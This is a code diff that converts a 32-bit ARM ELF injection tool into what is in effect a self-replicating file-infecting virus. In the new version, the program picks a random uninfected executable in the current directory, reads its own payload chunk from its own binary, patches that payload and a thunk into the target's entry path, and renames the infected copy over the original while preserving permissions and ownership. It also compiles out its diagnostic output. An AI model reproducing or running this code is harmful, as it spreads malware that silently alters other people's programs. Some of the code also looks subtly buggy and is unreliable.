@@ -1,4 +1,4 @@
-// gcc -Werror -Wall -Wextra -Wno-error=unused-parameter -Wno-error=unused-function -Wno-error=unused-variable -Wconversion -Wno-error=sign-conversion -fno-builtin -std=gnu99 -mgeneral-regs-only -fsanitize-undefined-trap-on-error -nostdlib -g3 -o elf_injector elf_injector.c
+// gcc -Werror -Wall -Wextra -Wno-error=unused-parameter -Wno-error=unused-function -Wno-error=unused-variable -Wconversion -Wno-error=sign-conversion -fno-builtin -std=gnu99 -mgeneral-regs-only -fsanitize-undefined-trap-on-error -nostdlib -g3 -DDEBUG -o copy_chunk copy_chunk.c
 #include <unistd.h>
 #include <fcntl.h>
 #include <dirent.h>
@@ -11,7 +11,10 @@
 #include <limits.h>
 #include "thunk_info.h"
 #include "inject_info.h"
+#ifdef STANDALONE
 #include "thunk.h"
+#include "chunk.h"
+#endif
 
 typedef __UINT8_TYPE__   u8;
 typedef __INT8_TYPE__    i8;
@@ -44,7 +47,7 @@ struct stat64
     u32 st_mode;
     u32 st_nlink;
     u32 st_uid;	
-    u32 st_gid;	
+    u32 st_gid;
     u64 st_rdev;
     u64 __pad2;
     i64 st_size;
@@ -61,7 +64,7 @@ struct stat64
     u32 __unused5;
 };
 
-#define PGSIZE   (1 << 12)
+#define PGSIZE  (1 << 12)
 // Each time an executable is injected, this marker is inserted into the
 // ELF header to prevent it from being injected a second time.
 #define I_MARKER 0xDB
@@ -145,31 +148,6 @@ static long syscall6(long n, long a, long b, long c, long d, long e, long f)
         : "r9", "r12", "memory"
     );
     return ret;
-}
-
-typedef void *jmp_buf[10];
-
-__attribute__((naked, returns_twice))
-static int setjmp(jmp_buf buf)
-{
-    (void) buf;
-    __asm volatile(
-        "stm r0, { r4-r11, sp, lr }\n"
-       "eor r0, r0\n"
-        "mov pc, lr\n"
-        );
-}
-
-__attribute__((naked, noreturn))
-static void longjmp(jmp_buf buf, int ret)
-{
-    (void)buf;
-    (void)ret;
-    __asm volatile(
-        "ldm r0, { r4-r11, sp, lr }\n"
-        "mov r0, r1\n"
-        "mov pc, lr\n"
-        );
 }
 
 __attribute__((naked))
@@ -274,187 +252,7 @@ static void *memcpy(void *d, const void *s, usize n)
     return d;
 }
 
-#define duitoa(i,s) uitoa((i),(s),10,"0123456789")
-#define xuitoa(i,s) uitoa((i),(s),16,"0123456789abcdef")
-
-static char *uitoa(unsigned int i, char *s, unsigned int base, const char *digits)
-{
-    int len = 1;
-    unsigned int t = i;
-    while (i /= base) len++;
-    char *beg = s + len;
-    *beg = '\0';
-    do
-    {
-        *--beg = digits[t % base];
-    } while (t /= base);
-    return s;
-}
-
-struct arena
-{
-    u8 *beg;
-    u8 *end;
-    size sz;
-    u8 **commit;
-    jmp_buf *ctx;
-};
-
-static bool new_arena(struct arena *a, jmp_buf *ctx, size sz)
-{
-    if (sz <= 0)
-    {
-        return false;
-    }
-    
-    sz += sizeof(a->commit);
-    u8 *beg = (u8 *) SYSCALL6(SYS_mmap2, NULL, sz, PROT_NONE,
-                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (beg == MAP_FAILED
-        || SYSCALL3(SYS_mprotect, beg, PGSIZE, PROT_READ | PROT_WRITE) == -1)
-    {
-        return false;
-    }
-    
-    a->sz = sz;
-    a->beg = beg;
-    a->end = a->beg + a->sz;
-    a->commit = (u8 **) a->beg;
-    *a->commit = a->beg + PGSIZE;
-    a->beg += sizeof(a->commit);
-    a->ctx = ctx;
-    return true;
-}
-
-#define new(a, t, n) (t *) alloc(a, sizeof(t), _Alignof(t), n)
-static void *alloc(struct arena *a, size sz, size align, size count)
-{
-    size pad = -(iptr) a->beg & (align - 1);
-    size avail = a->end - a->beg - pad;
-    if (avail < 0 || count > avail / sz)
-    {
-        longjmp(*a->ctx, 1);
-    }
-    
-    u8 *p = a->beg + pad;
-    a->beg += pad + count * sz;
-    if (a->beg >= *a->commit)
-    {
-        if (SYSCALL3(SYS_mprotect, *a->commit, 
-                     (usize) (a->beg - *a->commit + 1),
-                     PROT_READ | PROT_WRITE) == -1)
-        {
-            longjmp(*a->ctx, 1);
-        }
-        *a->commit = (u8 *) ((iptr) (a->beg + (PGSIZE - 1)) & ~(PGSIZE - 1));
-    }
-    
-    return memset(p, 0, (usize) (count * sz));
-}
-
-struct s8
-{
-    u8 *data;
-    size len;
-};
-
-static struct s8 s8cpy(struct arena *a, struct s8 s)
-{
-    struct s8 r = s;
-    r.data = new(a, u8, s.len);
-    if (r.len)
-    {
-        memcpy(r.data, s.data, (usize) r.len);
-    }
-    return r;
-}
-
-static struct s8 s8cat(struct arena *a, struct s8 head, struct s8 tail)
-{
-    if (!head.data || head.data + head.len != a->beg)
-    {
-        head = s8cpy(a, head);
-    }
-    head.len += s8cpy(a, tail).len;
-    return head;
-}
-
-static int s8open(struct arena a, struct s8 path, int flags)
-{
-    struct s8 tpath = s8cat(&a, path, s8nul);
-    return (int) SYSCALL2(SYS_open, tpath.data, flags);
-}
-
-static int s8unlink(struct arena a, struct s8 path)
-{
-    struct s8 tpath = s8cat(&a, path, s8nul);
-    return SYSCALL1(SYS_unlink, tpath.data);
-}
-
-static int s8chmod(struct arena a, struct s8 path, mode_t mode)
-{
-    struct s8 tpath = s8cat(&a, path, s8nul);
-    return SYSCALL2(SYS_chmod, tpath.data, mode);
-}
-
-static int s8chown(struct arena a, struct s8 path, uid_t own, gid_t grp)
-{
-    struct s8 tpath = s8cat(&a, path, s8nul);
-    return SYSCALL3(SYS_chown, tpath.data, own, grp);
-}
-
-static int s8stat64(struct arena a, struct s8 path, struct stat64 *sbuf)
-{
-    struct s8 tpath = s8cat(&a, path, s8nul);
-    return SYSCALL2(SYS_stat64, tpath.data, sbuf);
-}
-
-static size strlen(const char *s)
-{
-    size len = 0;
-    while (*s++) len++;
-    return len;
-}
-
-static int atoi(const char *s)
-{
-    const char *beg = s;
-    int sn = 1;
-    if (*beg == '-')
-    {
-        sn = -1;
-        beg++;
-    }
-    
-    int res = 0;
-    while (*beg)
-    {
-        int dig = *beg - '0';
-        if (sn == 1)
-        {
-            if (res > INT_MAX / 10
-                || (res == INT_MAX / 10 && dig > INT_MAX % 10))
-            {
-                return INT_MAX;
-            }
-            res *= 10;
-            res += dig;
-        }
-        else
-        {
-            if (res < INT_MIN / 10
-                || (res == INT_MIN / 10 && -dig < INT_MIN % 10))
-            {
-                return INT_MIN;
-            }
-            res *= 10;
-            res -= dig;
-        }
-        beg++;
-    }
-    return res;
-}
-
+#ifdef DEBUG
 struct buf
 {
     u8 *buf;
@@ -464,10 +262,8 @@ struct buf
     int err;
 };
 
-static u8 errbuf[128];
-static struct buf *stderr = &(struct buf) {errbuf, sizeof(errbuf), 0, 1, 0};
 static u8 outbuf[128];
-static struct buf *stdout = &(struct buf) {outbuf, sizeof(outbuf), 0, 2, 0};
+static struct buf *stderr = &(struct buf) {outbuf, sizeof(outbuf), 0, 1, 0};
 
 void flush(struct buf *b)
 {
@@ -494,7 +290,6 @@ static void append(struct buf *b, u8 *src, size len)
         }
         b->len += amt;
         src += amt;
-
         if (amt < left)
         {
             flush(b);
@@ -502,13 +297,240 @@ static void append(struct buf *b, u8 *src, size len)
     }
 }
 
-#define append_str(b, s)  append(b, (u8 *) s, strlen(s))
 #define append_cstr(b, s) append(b, (u8 *) s, lengthof(s))
 #define append_s8(b, s)   append(b, s.data, s.len)
+#else
+#define append_cstr(b, s)
+#define append_s8(b, s)
+#define flush(b)
+#endif
+
+struct arena
+{
+    u8 *beg;
+    u8 *end;
+    size sz;
+    u8 **commit;
+};
+
+static bool new_arena(struct arena *a, size sz)
+{
+    if (sz <= 0)
+    {
+        return false;
+    }
+    sz += sizeof(a->commit);
+    u8 *beg = (u8 *) SYSCALL6(SYS_mmap2, NULL, sz, PROT_NONE,
+                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (beg == MAP_FAILED
+        || SYSCALL3(SYS_mprotect, beg, PGSIZE, PROT_READ | PROT_WRITE) == -1)
+    {
+        return false;
+    }
+    a->sz = sz;
+    a->beg = beg;
+    a->end = a->beg + a->sz;
+    a->commit = (u8 **) a->beg;
+    *a->commit = a->beg + PGSIZE;
+    a->beg += sizeof(a->commit);
+    return true;
+}
+
+static void free_arena(struct arena *a)
+{
+    if (a->beg)
+    {
+        SYSCALL2(SYS_munmap, a->beg, a->sz);
+    }
+}
+
+#define new(a, t, n) (t *) alloc(a, sizeof(t), _Alignof(t), n)
+static void *alloc(struct arena *a, size sz, size align, size count)
+{
+    size pad = -(iptr) a->beg & (align - 1);
+    size avail = a->end - a->beg - pad;
+    if (avail < 0 || count > avail / sz)
+    {
+        return NULL;
+    }
+    u8 *p = a->beg + pad;
+    a->beg += pad + count * sz;
+    if (a->beg >= *a->commit)
+    {
+        if (SYSCALL3(SYS_mprotect, *a->commit, 
+                     (usize) (a->beg - *a->commit + 1),
+                     PROT_READ | PROT_WRITE) == -1)
+        {
+            return NULL;
+        }
+        *a->commit = (u8 *) ((iptr) (a->beg + (PGSIZE - 1)) & ~(PGSIZE - 1));
+    }
+    return memset(p, 0, (usize) (count * sz));
+}
+
+struct s8
+{
+    u8 *data;
+    size len;
+};
+
+#ifdef STANDALONE
+static int memcmp(void *m1, const void *m2, usize n)
+{
+    usize s = n;
+    const u8 *p = m1;
+    const u8 *q = m2;
+    while (s-- && *p++ == *q++);
+    return n && s == (usize) -1;
+}
+
+static bool s8equals(struct s8 s1, struct s8 s2)
+{
+    return s1.len == s2.len
+        && (!s1.len || !memcmp(s1.data, s2.data, (usize) s1.len));
+}
+#endif
+
+static bool s8cpy(struct arena *a, struct s8 *dst, struct s8 src)
+{
+    dst->len = src.len;
+    dst->data = new(a, u8, src.len);
+    if (!dst->data)
+    {
+        return false;
+    }
+    memcpy(dst->data, src.data, (usize) src.len);
+    return true;
+}
+
+static bool s8cat(struct arena *a, struct s8 *dst, struct s8 head,
+                  struct s8 tail)
+{
+    *dst = head;
+    if ((!head.data || head.data + head.len != a->beg)
+        && !s8cpy(a, dst, head))
+    {
+        return false;
+    }
+    if (!s8cpy(a, &head, tail))
+    {
+        return false;
+    }
+    dst->len += head.len;
+    return true;
+}
+
+static int s8open(struct arena a, struct s8 path, int flags)
+{
+    struct s8 tpath;
+    if (!s8cat(&a, &tpath, path, s8nul))
+    {
+        return -1;
+    }
+    return (int) SYSCALL2(SYS_open, tpath.data, flags);
+}
+
+#ifndef STANDALONE
+static int s8unlink(struct arena a, struct s8 path)
+{
+    struct s8 tpath;
+    if (!s8cat(&a, &tpath, path, s8nul))
+    {
+        append_cstr(stderr, "error: out of memory\n");
+        return -1;
+    }
+    return SYSCALL1(SYS_unlink, tpath.data);
+}
+
+static int s8rename(struct arena a, struct s8 oldpath, struct s8 newpath)
+{
+    struct s8 toldpath;
+    struct s8 tnewpath;
+    if (!s8cat(&a, &toldpath, oldpath, s8nul)
+        || !s8cat(&a, &tnewpath, newpath, s8nul))
+    {
+        append_cstr(stderr, "error: out of memory\n");
+        return -1;
+    }
+    return SYSCALL2(SYS_rename, toldpath.data, tnewpath.data);
+}
+#endif
+
+static int s8chmod(struct arena a, struct s8 path, mode_t mode)
+{
+    struct s8 tpath;
+    if (!s8cat(&a, &tpath, path, s8nul))
+    {
+        append_cstr(stderr, "error: out of memory\n");
+        return -1;
+    }
+    return SYSCALL2(SYS_chmod, tpath.data, mode);
+}
+
+static int s8chown(struct arena a, struct s8 path, uid_t own, gid_t grp)
+{
+    struct s8 tpath;
+    if (!s8cat(&a, &tpath, path, s8nul))
+    {
+        append_cstr(stderr, "error: out of memory\n");
+        return -1;
+    }
+    return SYSCALL3(SYS_chown, tpath.data, own, grp);
+}
+
+static int s8stat64(struct arena a, struct s8 path, struct stat64 *sbuf)
+{
+    struct s8 tpath;
+    if (!s8cat(&a, &tpath, path, s8nul))
+    {
+        append_cstr(stderr, "error: out of memory\n");
+        return -1;
+    }
+    return SYSCALL2(SYS_stat64, tpath.data, sbuf);
+}
+
+static size strlen(const char *s)
+{
+    if (!s)
+    {
+        return 0;
+    }
+    size len = 0;
+    while (*s++) len++;
+    return len;
+}
+
+#ifndef STANDALONE
+static bool find_aux(Elf32_auxv_t *aux, unsigned int type, unsigned int *val)
+{
+    for (Elf32_auxv_t *a = aux; a->a_type != AT_NULL; a++)
+    {
+        if (a->a_type == type)
+        {
+            *val = a->a_un.a_val;
+            return true;
+        }
+    }
+    return false;
+}
+
+static bool find_info(struct inject_info *ii, unsigned int type, unsigned int *val)
+{
+    for (struct inject_info *i = ii; i->type != II_NULL; ii++)
+    {
+        if (type == i->type)
+        {
+            *val = i->val;
+            return true;
+        }
+    }
+    return false;
+}
+#endif
 
 struct code
 {
-    u8  *base;
+    u8 *base;
     size len;
 };
 
@@ -532,8 +554,8 @@ static bool is_exec(struct arena scratch, struct s8 fname)
         return false;
     }
 
-    Elf32_Ehdr ehdr;
     bool is_exec = false;
+    Elf32_Ehdr ehdr;
     if (SYSCALL3(SYS_read, fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr))
     {
         append_cstr(stderr, "error: reading ");
@@ -541,7 +563,7 @@ static bool is_exec(struct arena scratch, struct s8 fname)
         append_cstr(stderr, "\n");
         goto cleanup;
     }
-
+    
     if (ehdr.e_ident[0] != ELFMAG0
         || ehdr.e_ident[1] != ELFMAG1
         || ehdr.e_ident[2] != ELFMAG2
@@ -555,7 +577,7 @@ static bool is_exec(struct arena scratch, struct s8 fname)
         append_cstr(stderr, " is not an executable\n");
         goto cleanup;
     }
-
+    
     if ((ehdr.e_ident[EI_NIDENT - 1] & I_MARKER) == I_MARKER)
     {
         append_cstr(stderr, "error: ");
@@ -568,6 +590,91 @@ static bool is_exec(struct arena scratch, struct s8 fname)
 cleanup:
     SYSCALL1(SYS_close, fd);
     return is_exec;
+}
+
+
+static unsigned int prand_next(unsigned int *state)
+{
+    *state = (1664525 * (*state) + 1013904223);
+    return *state;
+}
+
+static bool get_exec_name(struct arena *perm, struct arena scratch, 
+                          struct s8 *ename)
+{
+    int fd;
+    fd = (int) SYSCALL2(SYS_open, ".", O_RDONLY);
+    if (fd < 0)
+    {
+        append_cstr(stderr, "error: opening current directory\n");
+        return false;
+    }
+
+    bool picked = false;
+    struct timespec ts;
+    if (SYSCALL2(SYS_clock_gettime, CLOCK_REALTIME, &ts) < 0)
+    {
+        append_cstr(stderr, "error: getting time\n");
+        goto cleanup;
+    }
+    unsigned int state = (unsigned int) (ts.tv_nsec * 1000000000 + ts.tv_sec);
+
+    struct arena ptmp = *perm;
+    char dents[1024];
+    long nbytes;
+    unsigned int cnt = 1;
+    while ((nbytes = SYSCALL3(SYS_getdents64, fd, dents, sizeof(dents))) > 0)
+    {
+        long pos = 0;
+        while (pos < nbytes)
+        {
+            struct linux_dirent64
+            {
+                u64 d_ino;
+                i64 d_off;
+                u16 d_reclen;
+                unsigned char d_type;
+                char d_name[];
+            };
+            struct linux_dirent64 *dent 
+                = (struct linux_dirent64 *) (dents + pos);
+            if (dent->d_type == DT_REG)
+            {
+                struct s8 fname = {(u8 *) dent->d_name, strlen(dent->d_name)};
+#ifdef STANDALONE
+                if (!s8equals(fname, s8("elf_injector_embed"))
+                    && is_exec(scratch, fname))
+#else                
+                if (is_exec(scratch, fname))
+#endif                    
+                {
+                    if (prand_next(&state) % cnt == 0)
+                    {
+                        picked = true;
+                        ptmp = *perm;
+                        if (!s8cpy(&ptmp, ename, fname))
+                        {
+                            append_cstr(stderr, "error: out of memory\n");
+                            goto cleanup;
+                        }
+                    }
+                    cnt++;
+                }
+            }
+            pos += dent->d_reclen;
+        }
+    }
+    
+    if (nbytes < 0)
+    {
+        append_cstr(stderr, "error: listing directory\n");
+        goto cleanup;
+    }
+    *perm = ptmp;        
+    
+cleanup:
+    SYSCALL1(SYS_close, fd);
+    return picked;
 }
 
 static bool load_exec(struct arena scratch, struct s8 fname, struct code *exec)
@@ -590,7 +697,7 @@ static bool load_exec(struct arena scratch, struct s8 fname, struct code *exec)
         append_cstr(stderr, "\n");
         goto cleanup;
     }
-
+    
     u8 *base;
     base = (u8 *) SYSCALL6(SYS_mmap2, NULL, sbuf.st_size,
                            PROT_READ | PROT_WRITE,
@@ -612,66 +719,106 @@ cleanup:
     return success;
 }
 
-static void load_thunk(struct code *thunk)
+static bool load_thunk(struct arena *perm, Elf32_auxv_t *aux, struct code *thunk)
 {
+#ifdef STANDALONE
+    (void) perm;
+    (void) aux;
     thunk->len = TNK_LEN;
     thunk->base = _thunk;
+    return true;
+#else
+    size ent;
+    if (!find_aux(aux, AT_ENTRY, (unsigned int *) &ent))
+    {
+        append_cstr(stderr, "error: cannot find entry point\n");
+        return false;
+    }
+    thunk->len = TNK_LEN;
+    thunk->base = new(perm, u8, thunk->len);
+    if (!thunk->base)
+    {
+        append_cstr(stderr, "error: out of memory\n");
+        return false;
+    }
+    
+    memcpy(thunk->base, (u8 *) (ent - TNK_ENT_OFF), (usize) thunk->len);
+    return true;
+#endif
 }
 
-static bool load_chunk(struct arena scratch, struct s8 fname, 
-                       size chunk_ent_off, struct code *chunk)
+static bool load_chunk(struct arena *perm, struct arena scratch,
+                       struct s8 me, struct inject_info *ii,
+                       struct code *chunk) 
 {
-    int fd = s8open(scratch, fname, O_RDONLY);
+#ifdef STANDALONE
+    (void) perm;
+    (void) scratch;
+    (void) me;
+    (void) ii;
+    chunk->len = CNK_LEN;
+    chunk->base = _chunk;
+    return true;
+#else
+    size pos;
+    if (!find_info(ii, II_CNK_POS, (unsigned int *) &pos)
+        || !find_info(ii, II_CNK_LEN, (unsigned int *) &chunk->len))
+    {
+        append_cstr(stderr, "error: cannot find chunk info\n");
+        return false;
+    }
+    chunk->base = new(perm, u8, chunk->len);
+    if (!chunk->base)
+    {
+        append_cstr(stderr, "error: out of memory\n");
+        return false;
+    }
+
+    int fd = s8open(scratch, me, O_RDONLY);
     if (fd < 0)
     {
         append_cstr(stderr, "error: opening ");
-        append_s8(stderr, fname);
+        append_s8(stderr, me);
         append_cstr(stderr, "\n");
         return false;
     }
 
-    bool success = false;
-    struct stat64 sbuf;    
-    if (SYSCALL2(SYS_fstat64, fd, &sbuf) < 0)
+    bool chunk_read = false;
+    if (SYSCALL3(SYS_lseek, fd, pos, SEEK_SET) < 0)
     {
-        append_cstr(stderr, "error: statting ");
-        append_s8(stderr, fname);
+        append_cstr(stderr, "error: seeking\n");
+        goto cleanup;
+    }
+    if (SYSCALL3(SYS_read, fd, chunk->base, chunk->len) != chunk->len)
+    {
+        append_cstr(stderr, "error: reading ");
+        append_s8(stderr, me);
         append_cstr(stderr, "\n");
         goto cleanup;
     }
-        
-    if (chunk_ent_off > sbuf.st_size - 4)
-    {
-        append_cstr(stderr, "error: invalid entry offset\n");
-        goto cleanup;
-    }
-
-    u8 *base;
-    base = (u8 *) SYSCALL6(SYS_mmap2, NULL, sbuf.st_size, PROT_READ,
-                           MAP_PRIVATE, fd, 0);
-    if (base == MAP_FAILED)
-    {
-        append_cstr(stderr, "error: mapping ");
-        append_s8(stderr, fname);
-        append_cstr(stderr, "\n");
-        goto cleanup;
-    }
-
-    chunk->len = (size) sbuf.st_size;
-    chunk->base = base;
-    success = true;
+    chunk_read = true;
 
 cleanup:
     SYSCALL1(SYS_close, fd);
-    return success;
+    return chunk_read;
+#endif    
+}
+   
+static bool load(struct arena *perm, struct arena scratch, 
+                 struct s8 me, struct s8 ename, Elf32_auxv_t *aux,
+                 struct inject_info *ii, struct binary *bin)
+{
+    load_chunk(perm, scratch, me, ii, &bin->chunk);
+    return load_exec(scratch, ename, &bin->exec)
+        && load_thunk(perm, aux, &bin->thunk);
 }
 
-static bool load(struct arena scratch, struct s8 cname, struct s8 ename, 
-                 size chunk_ent_off, struct binary *bin)
+static void unload(struct binary *bin)
 {
-    load_thunk(&bin->thunk);
-    return load_exec(scratch, ename, &bin->exec)
-        && load_chunk(scratch, cname, chunk_ent_off, &bin->chunk);
+    if (bin->exec.base)
+    {
+        SYSCALL2(SYS_munmap, bin->exec.base, bin->exec.len);
+    }
 }
 
 static Elf32_Phdr *get_text_phdr(Elf32_Ehdr *ehdr, Elf32_Phdr *phdrs)
@@ -690,10 +837,10 @@ static Elf32_Phdr *get_text_phdr(Elf32_Ehdr *ehdr, Elf32_Phdr *phdrs)
     return NULL;
 }
 
-static bool inject(struct binary *bin, size thunk_ent_off, size chunk_ent_off,
-                   size *off)
+static bool inject(struct binary *bin, size thunk_ent_off,
+                   size chunk_ent_off, size *off)
 {
-    assert(bin->thunk.len < PGSIZE && !(bin->thunk.len & 0x3));
+    assert(bin->thunk.len < PGSIZE && !(bin->thunk.len& 0x3));
     
     Elf32_Ehdr *ehdr = (Elf32_Ehdr *) bin->exec.base;
     Elf32_Phdr *phdrs = (Elf32_Phdr *) (bin->exec.base + ehdr->e_phoff);
@@ -786,7 +933,6 @@ static bool inject(struct binary *bin, size thunk_ent_off, size chunk_ent_off,
     memcpy(bin->thunk.base + OFF_CNK_LEN, &tchunk_len, sizeof(tchunk_len));
     memcpy(bin->thunk.base + OFF_CNK_ENT_OFF, &tchunk_ent_off, 
            sizeof(tchunk_ent_off));
-    
     // Patch the thunk so that it will call the original entry point when it
     // finishes.
     memcpy(bin->thunk.base + OFF_HOST_ENT, &ehdr->e_entry, 
@@ -821,37 +967,27 @@ static bool inject(struct binary *bin, size thunk_ent_off, size chunk_ent_off,
     return true;
 }
 
-static void log_insert(size len, struct s8 type, size ent_off, size ins_off)
-{
-    char val[64];
-    append_cstr(stdout, "inserted ");
-    duitoa((unsigned int) len, val);
-    append_str(stdout, val);
-    append_cstr(stdout, " byte ");
-    append_s8(stdout, type);
-    append_cstr(stdout, " at pos 0x");
-    xuitoa((unsigned int) ins_off, val);
-    append_str(stdout, val);
-    append_cstr(stdout, ", start 0x");
-    xuitoa((unsigned int) (ins_off + ent_off), val);
-    append_str(stdout, val);
-    append_cstr(stdout, "\n");
-}
-
 static bool output(struct arena scratch, struct s8 fname, struct binary *bin,
-                   size ins_off, size chunk_ent_off)
-{    
-    struct s8 tname = s8cat(&scratch, fname, s8(".injected"));
+                   size ins_off)
+{
+    bool success = false;
+    struct s8 tname;
+
+    if (!s8cat(&scratch, &tname, fname, s8(".injected")))
+    {
+        append_cstr(stderr, "error: out of memory\n");
+        return false;
+    }
+    
     int fd = s8open(scratch, tname, O_WRONLY | O_TRUNC | O_CREAT);
     if (fd < 0)
     {
         append_cstr(stderr, "error: opening ");
         append_s8(stderr, tname);
         append_cstr(stderr, "\n");
-        return false;
+        goto cleanup;
     }
-
-    bool success = false;
+    
     struct stat64 sbuf;
     if (s8stat64(scratch, fname, &sbuf) < 0)
     {
@@ -863,6 +999,11 @@ static bool output(struct arena scratch, struct s8 fname, struct binary *bin,
     
     u8 *pad1 = new(&scratch, u8, bin->pad1);
     u8 *pad2 = new(&scratch, u8, bin->pad2);
+    if (!pad1 || !pad2)
+    {
+        append_cstr(stderr, "error: out of memory\n");
+        goto cleanup;
+    }
     size remain_len = bin->exec.len - ins_off;
     if (SYSCALL3(SYS_write, fd, bin->exec.base, (usize) ins_off) != ins_off
         || SYSCALL3(SYS_write, fd, pad1, (usize) bin->pad1) != bin->pad1
@@ -876,7 +1017,7 @@ static bool output(struct arena scratch, struct s8 fname, struct binary *bin,
         append_cstr(stderr, "\n");
         goto cleanup;
     }
-
+    
     if (s8chmod(scratch, tname, sbuf.st_mode) < 0
         || s8chown(scratch, tname, sbuf.st_uid, sbuf.st_gid) < 0)
     {
@@ -885,79 +1026,101 @@ static bool output(struct arena scratch, struct s8 fname, struct binary *bin,
         append_cstr(stderr, "\n");
         goto cleanup;
     }
-
-    log_insert(bin->thunk.len, s8("thunk"), TNK_ENT_OFF, ins_off);
-    log_insert(bin->chunk.len, s8("chunk"), chunk_ent_off,
-               ins_off + bin->thunk.len + bin->pad1);
+#ifndef STANDALONE
+    if (s8rename(scratch, tname, fname) < 0)
+    {
+        append_cstr(stderr, "error: renaming ");
+        append_s8(stderr, tname);
+        append_cstr(stderr, " to ");
+        append_s8(stderr, fname);
+        append_cstr(stderr, "\n");
+        goto cleanup;
+    }
+#endif    
     success = true;
 
 cleanup:
-    if (!success)
-    {
-        s8unlink(scratch, tname);
-    }
+#ifndef STANDALONE
+    s8unlink(scratch, tname);
+#endif    
     SYSCALL1(SYS_close, fd);
     return success;
 }
 
-int start(int argc, char **argv)
+void start(int argc, char **argv, char **env, Elf32_auxv_t *aux, struct inject_info *ii)
 {
-    volatile int success = -1;
-    jmp_buf ctx;
+    (void) argc;
+    (void) argv;
+    (void) env;
+    (void) aux;
+        
     struct arena perm = { 0 };
     struct arena scratch = { 0 };
-    if (!new_arena(&perm, &ctx, 1 << 12)
-        || !new_arena(&scratch, &ctx, 1 << 12)
-        || setjmp(ctx))
+    if (!new_arena(&perm, 1 << 12)
+        || !new_arena(&scratch, 1 << 12))
     {
         append_cstr(stderr, "error: out of memory\n");
         goto cleanup;
     }
-    
-    if (argc != 4)
-    {
-        append_cstr(stderr, "usage: elf_injector <exec> <chunk> <entry offset>\n");
-        goto cleanup;
-    }
 
-    struct s8 ename = s8cstr(argv[1]);
-    struct s8 cname = s8cstr(argv[2]);    
-    if (!is_exec(scratch, ename))
+    size chunk_ent_off;
+#ifdef STANDALONE
+    chunk_ent_off = CNK_ENT_OFF;
+#else
+    if (!find_info(ii, II_CNK_ENT_OFF, (unsigned int *) &chunk_ent_off))
     {
+        append_cstr(stderr, "error: cannot find chunk info\n");
         goto cleanup;
     }
-    
-    size chunk_ent_off = atoi(argv[3]);
-    if (chunk_ent_off < 0)
-    {
-        append_cstr(stderr, "error: invalid entry offset\n");
-        goto cleanup;
-    }
+#endif
 
-    struct binary bin = { 0 };
+    if (!argv[0])
+    {
+        append_cstr(stderr, "error: no executable name\n");
+        goto cleanup;
+    }
+    struct s8 me = s8cstr(argv[0]);
+    struct s8 ename;
     size ins_off;
-    if (!load(scratch, cname, ename, chunk_ent_off, &bin)
+    struct binary bin = { 0 };
+    if (!get_exec_name(&perm, scratch, &ename)
+        || !load(&perm, scratch, me, ename, aux, ii, &bin)
         || !inject(&bin, TNK_ENT_OFF, chunk_ent_off, &ins_off)
-        || !output(scratch, ename, &bin, ins_off, chunk_ent_off))
+        || !output(scratch, ename, &bin, ins_off))
+        
     {
         goto cleanup;
     }
-    success = 0;
 
 cleanup:
-    flush(stdout);    
+    unload(&bin);
+    free_arena(&scratch);
+    free_arena(&perm);
     flush(stderr);
-    return success;
 }
 
+#ifdef STANDALONE
 __attribute__((naked, noreturn))
 void _start(void)
 {
     __asm volatile (
         "ldr     r0, [sp]\n"
         "add     r1, sp, #4\n"
+        "add     r2, r1, r0, lsl #2\n"
+        "mov     r3, r2\n"
+        "add     r2, r2, #4\n"
+        "not_zero:\n"
+        "add     r3, r3, #4\n"
+        "ldr     r4, [r3]\n"
+        "cmp     r4, #0\n"
+        "bne     not_zero\n"
+        "add     r3, r3, #4\n"
+        "sub     sp, sp, #4\n"
+        "eor     r5, r5\n"
+        "str     r5, [sp]\n"
         "bl      start\n"
         "mov     r7, #1\n"
         "swi     #0\n"
         );
 }
+#endif
